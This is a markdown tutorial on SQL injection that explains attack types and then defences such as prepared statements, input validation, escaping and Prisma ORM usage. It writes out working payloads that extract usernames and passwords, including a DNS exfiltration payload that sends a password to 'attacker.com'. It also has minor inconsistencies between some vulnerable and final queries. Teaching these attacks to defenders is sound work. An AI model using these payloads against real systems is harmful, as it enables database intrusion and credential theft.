# SQL Injection (SQLi)

## Table of Contents

1. [Introduction](#introduction)
2. [Types of SQL Injection](#types-of-sql-injection)
3. [Prevention Techniques](#prevention-techniques)
4. [Parameterized Queries](#parameterized-queries)
5. [ORM Security](#orm-security)
6. [Best Practices](#best-practices)

## Introduction

SQL Injection is a web security vulnerability that allows attackers to interfere with database queries, potentially leading to:

-   Unauthorized data access
-   Data manipulation
-   Data deletion
-   Authentication bypass
-   Command execution

It has been ranked as the number one risk on the [OWASP Top 10](https://owasp.org/www-project-top-ten/) list since 2010, just moved to 3rd position in 2021.

OWASP Top 10 is a list of the 10 most critical security risks to web applications. It is updated every 3-4 years by a team of security experts from around the world.

## Types of SQL Injection

### 1. In-band SQLi (Classic)

Direct retrieval of data through the same channel used to inject the SQL code. The attack and data extraction happen through the same endpoint.
#### Error-based

```sql
-- Vulnerable query
SELECT title, content FROM articles WHERE id = '$id' AND user_id = '$user_id'

-- Attack payload
"1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(username,':',password,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--"

-- Final query
SELECT title, content FROM articles WHERE id = '1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(username,':',password,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)-- AND user_id = '1'

-- Causes error like:
"Duplicate entry 'admin:password123' for key 'group_key'"
```

#### Union-based

```sql
-- Vulnerable query
SELECT title, content FROM articles WHERE id = '$id' AND user_id = '$user_id'

-- Attack payload
"1 UNION SELECT username, password FROM users--"

-- Final query
SELECT title, content FROM articles WHERE id = '1' UNION SELECT username, password FROM users-- AND user_id = '$user_id'

-- Returns:
[
  {"title": "Article 1", "content": "Content 1"},
  {"title": "Article 2", "content": "Content 2"},
  {"title": "admin", "content": "password123"},
  {"title": "user1", "content": "secret456"}
]
```

### 2. Blind SQLi

When results are not directly visible to the attacker.

#### Boolean-based

```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Attack payload
"admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50--"

-- Final query
SELECT * FROM users WHERE username = 'admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50-- AND password = '$password'

-- Final query becomes
SELECT * FROM users WHERE username = 'admin' AND (true_or_false)-- AND password = '$password'

-- Returns admin's record if the condition is true
```

#### Time-based

```sql
-- Attack payload
"admin' AND IF(ASCII(SUBSTRING(password,1,1))>50, SLEEP(5), IF(ASCII(SUBSTRING(password,1,1))>60, SLEEP(3), SLEEP(1))--"

-- Final query
SELECT * FROM users WHERE username = 'admin' AND IF(ASCII(SUBSTRING(password,1,1))>50, SLEEP(5), IF(ASCII(SUBSTRING(password,1,1))>60, SLEEP(3), SLEEP(1))-- AND password = '$password'

-- Nested If

IF(
    ASCII(SUBSTRING(password,1,1))>90, 
    SLEEP(5), 
    IF(ASCII(SUBSTRING(password,1,1))>60, 
        SLEEP(3), 
        SLEEP(1)
    )
)

-- based on the time taken to respond, attacker can infer the password
```

### 3. Out-of-band SQLi

When the attacker is unable to see the result of the SQL query in the application's response. The attacker uses an out-of-band channel to retrieve data.

#### DNS-based

```sql
-- Vulnerable query
SELECT * FROM products WHERE id = '$id'

-- Attack payload
"admin' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com')))--"

-- Final query
SELECT * FROM users WHERE username = 'admin' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com')))-- AND password = '$password'

-- CONCAT('\\\\', 'secret123', '.attacker.com')

-- SELECT LOAD_FILE('\\\\secret123.attacker.com')

-- The attacker can monitor DNS requests to 'attacker.com' to retrieve the password
```


## Prevention Techniques

### 1. Prepared Statements

```javascript
// Vulnerable
const query = `SELECT * FROM users WHERE username = '${username}'`

// Safe
const query = 'SELECT * FROM users WHERE username = ?'
db.query(query, [username])
//Query structure is fixed
//Parameters treated as literals, not code
//Special characters escaped automatically

// Attack payload
"admin' OR '1'='1"

// Final query
SELECT * FROM users WHERE username = 'admin'' OR ''1''=''1'
```

### 2. Input Validation

```javascript
// Whitelist validation
function isValidUsername(username) {
    return /^[a-zA-Z0-9_]{3,20}$/.test(username)
}

// Test invalid inputs
const invalidUsernames = [
    // Too short (< 3 chars)
    "",

    // Too long (> 20 chars)
    "very_long_username_12345",
    
    // Invalid characters,
    "user'name",
    "user;name",
    
    // Special characters
    "españa123",
    "user🔥name",
    
    // SQL injection attempts
    "admin'--",
    "admin/**/",
    "admin;--",
];
```

### 3. Escaping Special Characters

```javascript
function escapeSQL(unsafe) {
    return unsafe
        .replace(/'/g, "''")
        .replace(/\\/g, '\\\\')
        .replace(/\x00/g, '\\0')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/"/g, '\\"')
        .replace(/--/g, '\\-\\-')
}

// "end--" becomes "end\-\-" to prevent comment injection
```

## ORM Security

An ORM is a programming technique that lets developers work with databases using object-oriented programming concepts, instead of writing raw SQL queries. 

Instead of writing database queries directly, you work with objects in your programming language. The ORM handles the conversion between your objects and database tables automatically.
### Prisma Example

```javascript
// Safe by default
const user = await prisma.user.findUnique({
    where: {
        username: username,
    },
})

// Safe raw queries
// Converts to prepared statements internally
const result = await prisma.$queryRaw`
    SELECT * FROM users WHERE username = ${username}
`

// Unsafe raw queries
const result = await prisma.$queryRaw`
    SELECT * FROM users WHERE username = '${username}'
`
```

## Best Practices

### 1. Database Configuration

```javascript
// Principle of least privilege
const dbConfig = {
    user: 'app_user',
    password: 'secret',
    database: 'myapp',
    // Limit permissions
    allowedCommands: ['SELECT', 'INSERT', 'UPDATE'],
    // Restrict database access
    host: 'api.myapp.com',
    // Use connection pooling
    connectionLimit: 10,
}
```

### 2. Query Construction

-   Use parameterized queries
-   Validate and sanitize all inputs
-   Use ORMs when possible

### 3. Error Handling

```javascript
// Don't expose SQL errors
app.use((err, req, res, next) => {
    if (err.code === 'ER_PARSE_ERROR') {
        res.status(400).json({
            error: 'Invalid input', // Generic error
        })
    } else {
        next(err)
    }
})
```
